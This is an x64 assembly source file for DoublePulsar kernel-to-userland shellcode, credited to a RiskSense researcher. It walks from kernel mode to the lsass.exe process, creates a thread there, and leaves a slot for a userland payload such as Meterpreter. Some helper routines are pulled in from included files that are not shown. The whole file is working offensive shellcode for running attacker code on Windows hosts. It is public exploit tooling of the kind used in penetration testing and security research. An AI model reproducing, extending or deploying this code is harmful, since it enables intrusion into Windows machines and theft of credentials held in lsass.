;
; Windows x64 Kernel DoublePulsar Ring 0 to Ring 3 Shellcode
;
; Author: Sean Dillon <sean.dillon@risksense.com> (@zerosum0x0)
; Copyright: (c) 2017 RiskSense, Inc.
; License: Apache 2.0
;

%include "./src/exploit/constants.asm"

kernel_start:
  ; cld

  push rsp
  and sp, 0xFFF0                                    ; align stack
  push rsi                                          ; save clobbered registers
  push r15                                          ; r15 will store ntoskernl.exe

; this stub loads ntoskrnl.exe into rax
%include "./src/kernel/find_nt_idt.asm"

  mov r15, rax                                      ; save ntoskrnl.exe

  lea rdx, [rel kernel_start]                             ; overwrite the _start with PEPROCESS
  mov r10d, LSASS_EXE_HASH
%include "./src/kernel/find_process_name.asm"

%include "./src/kernel/calc_thread_delta.asm"

kernel_exit:

  pop r15
  pop rsi                                           ; restore clobbered registers and return
  pop rsp
  ret

userland_start:

  jmp userland_start_thread

; user and kernel mode re-use this code
%include "./src/single/calc_hash.asm"
%include "./src/block/block_api_direct.asm"

userland_start_thread:
%include "./src/single/createthread.asm"

userland_payload:
  ; insert userland payload here
  ; such as meterpreter
  ; or reflective dll with the metasploit MZ pre-stub
